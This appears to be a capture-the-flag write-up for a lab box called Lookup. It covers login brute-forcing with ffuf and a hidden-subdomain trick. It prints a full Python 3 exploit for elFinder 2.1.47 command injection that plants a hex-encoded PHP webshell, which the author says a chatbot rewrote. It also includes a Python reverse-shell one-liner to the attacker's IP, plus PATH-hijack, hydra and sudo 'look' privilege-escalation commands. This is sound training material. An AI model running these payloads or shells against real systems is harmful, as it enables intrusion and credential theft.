## Inital scanning


The first thing I do on every box, is a `nmap` scan. I added all ports, activated version output and used the default scripts. In addition to that I outputed the scan in all formats to the `nmap` dir and activated double verbosity, so if a port is discovered I see it.

```sh
sudo nmap -p- -sV -sC -oA nmap/lookup -vv 10.10.238.64
```

The `nmap` scan shows that only two ports are open, one is `ssh` the other one is `Apache`. 
```

```

If we try to access the web server we are redirected to `http://lookup.thm`, I added `lookup.thm` to my `/etc/hosts` file.
```
10.10.153.26  lookup.thm
```
Next I tried to enumerate for subdomains, because this was mentioned in the challenge description.

```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.lookup.thm" -u http://10.10.238.64 -fs 0
```

After a while trying different wordlists, I could only find `www.lookup.thm` which is the same page as `lookup.thm`, that's why I stopped there and now focused at the login page. I first tired special characters and looked for the low hanging fruits like SQL-Injection or other injections, but I didn't find any vulerabilities. Then I tried default usernames and passwords.

![](/assets/blog/Lookup/login.png)

Interestingly, I found that using 'admin' as the username returns different results from the site compared to using a username that doesn't exist.

**Not existing user:**
![](/assets/blog/Lookup/burp2.png)

**Existing user:**
![](/assets/blog/Lookup/burp1.png)

I then used the tool I like the most `ffuf` to find a password for this user.
I used the following request payload:

```
POST /login.php HTTP/1.1
Host: www.lookup.thm
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0

username=admin&password=FUZZ
```

```sh
ffuf -request password.brute -request-proto http -w /usr/share/wordlists/rockyou.txt -fs 62
```

The results look promising:

![](/assets/blog/Lookup/password.png)

We successfully found a password. Now let's try it!
![](/assets/blog/Lookup/burp3.png)

What... what da, this was unexpected, now both parts of the credentils are wrong. The only possible solution now can be that the password and username are check independently so now we have a password and need a username for that password!?.

So next I modified the request from above: ...
```
username=FUZZ&password=YOURFOUNDPASSWORD
```

... and used the modified command with some random wordlist form `seclists`.

```sh
ffuf -request password.brute -request-proto http -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -fs 74
```

![](/assets/blog/Lookup/ffuf.png)

Nice, we got it, this looks more promising.

![](/assets/blog/Lookup/burp4.png)

The request redirects us with a cookie to `files.lookup.thm`, how could we miss that by the subdomain scanner?

### Intresting domain hidding techinque

If we look at the response from a non existing subdomain, the response is exactly the same as the one from the subdomain `files.lookup.thm`.
![](/assets/blog/Lookup/burp5.png)

![](/assets/blog/Lookup/burp6.png)

**Only if our cookie `login_status=success` is set we get redirected again to `http://files.lookup.thm/elFinder/elfinder.html`.**

## Subdomain application

Let's check this application running on the subdomain `files.lookup.thm`. It looks like some file management program. The first thing I do is check what that application is, if it's a custom application or something from the web.  

![](/assets/blog/Lookup/what.png)

I run `gobuster` on the folder and found this changelog, the reason this is important, is that we normally see a version inside such files, `http://files.lookup.thm/elFinder/Changelog`.
```sh
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://files.lookup.thm/elFinder
```

![](/assets/blog/Lookup/gobuster.png)

At the top of this file we can spot the version `2.1.47`. If we Google that with the application name `elFinder` we will find a command injection vulnerability.

![](/assets/blog/Lookup/google.png)

I looked at the exploit:
![](/assets/blog/Lookup/exploit.png)

Two things caught my eye:
- This exploit is in python2 (Parrot somehow doesn't like that....)
- We need a `SecSignal.jpg` file, I downloaded a random one from the internet.

To fix the first issue, I asked ChactGPT *friendly*, if he would like to rewrite the script in `python3` and, it did it!

```python
#!/usr/bin/python3

import requests
import json
import sys

payload = 'SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > SecSignal.php;echo SecSignal.jpg'


def usage():
    if len(sys.argv) != 2:
        print("Usage: python3 exploit.py [URL]")
        sys.exit(0)


def upload(url, payload):
    with open('SecSignal.jpg', 'rb') as f:
        files = {'upload[]': (payload, f)}
        data = {
            "reqid": "1693222c439f4",
            "cmd": "upload",
            "target": "l1_Lw",
            "mtime[]": "1497726174"
        }
        r = requests.post(f"{url}/php/connector.minimal.php", files=files, data=data)
        j = json.loads(r.text)
        return j['added'][0]['hash']


def imgRotate(url, file_hash):
    r = requests.get(
        f"{url}/php/connector.minimal.php?target={file_hash}&width=539&height=960&degree=180&quality=100&bg=&mode=rotate&cmd=resize&reqid=169323550af10c"
    )
    return r.text


def shell(url):
    r = requests.get(f"{url}/php/SecSignal.php")
    if r.status_code == 200:
        print("[+] Pwned! :)")
        print("[+] Getting the shell...")
        while True:
            try:
                user_input = input("$ ")
                r = requests.get(f"{url}/php/SecSignal.php?c={user_input}")
                print(r.text)
            except KeyboardInterrupt:
                sys.exit("\nBye kaker!")
    else:
        print("[*] The site seems not to be vulnerable :(")


def main():
    usage()
    url = sys.argv[1]
    print("[*] Uploading the malicious image...")
    file_hash = upload(url, payload)
    print("[*] Running the payload...")
    imgRotate(url, file_hash)
    shell(url)


if __name__ == "__main__":
    main()

```

Now let's execute the exploit with the URL of the server.

![](/assets/blog/Lookup/shell0.png)

Nice we got a shell, I generated a second shell stage payload from `revshells.com`, to get a nicer shell and then [stabalized the shell](https://ocelotsecurity.com/wp-content/uploads/2021/02/test.png).
```sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.78.229",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
nc -lvnp 4444 # on my machine
```

## User

I now went for the user flag, but the user flag wasn't readable, so we first need to think how we get *think*, the local user ironicly;)

![](/assets/blog/Lookup/userdir.png)

Enough with the jokes, let's search for possible attack vectors. I usually start searching for the low hanging fruits here too. This includes checking if there are any SUID binarys. I do this with this command:
```sh
find / -perm -u=s -type f 2>/dev/null
```

![](/assets/blog/Lookup/SUID.png)

There is one file named `pwm`, what ever that name means, if we check the permissions with `ls -la`, we can see that it runs as root (`-rwsr-sr-x 1 root root`). To don't waste time downloading the file for reversing I simply run it.

![](/assets/blog/Lookup/run0.png)

The file executed the `id` command?! and prints the file `.passwords` which we earlier saw in the home directory of the user *think*. That looks interesting, I now used `strings` to get some deeper unerstanding of what the binary does:

![](/assets/blog/Lookup/string.png)

So now I know what we should do:
- First we need to generate our own `id` script file wich simply prints the id like the legitimate `id` command (`uid=1000(think)`)
- The next step is to add our `id` script path to our `PATH` environment variable, the SUID file will now use this `PATH` to find our script
- This script file then forges the user `think` and will print the password file inside the directory of the user *think*

Let's do it and then execute the script:

```sh
echo "echo 'uid=1000(think)'" > id
chmod +x id
export PATH=$PWD:$PATH
```

![](/assets/blog/Lookup/exploit2.png)

We successfully get a list of passwords, these must be the passwords for the user *think*, I copied them to a wordlist file.

```sh
hydra -l think -P wordlist.txt ssh://10.10.153.26
```

![](/assets/blog/Lookup/password2.png)

We got the passwod and can login via `ssh` to the server now.

![](/assets/blog/Lookup/user.png)

## Root

Let's now check what we need to do to become root. If I already have a fully functioning user I usually start by checking the sudo rigths with `sudo -l`.

![](/assets/blog/Lookup/sudo.png)

We can execute the file `/usr/bin/look`, which likely is our target here. I now run it:

![](/assets/blog/Lookup/look.png)

This program *look*s like `grep`, we can use it to find a string, if we run it, with the `/etc/shadow` as the destination file, we can see that it only outputs the lines of this file which start with the string we specified.

![](/assets/blog/Lookup/root.png)

We can now abuse this: We know that the root flag location and we know must be some hex characters, so we can check them all, we can use the command below to get the final flag.

```sh
for i in {0..15} ; do sudo /usr/bin/look $(printf '%x\n' $i) /root/root.txt; done
```

![](/assets/blog/Lookup/final.png)

This was the challenge, I really liked it.

## Conclusion

The point I liked the most was the subdomain hiding, this is a nice technique to hide a subdomain.
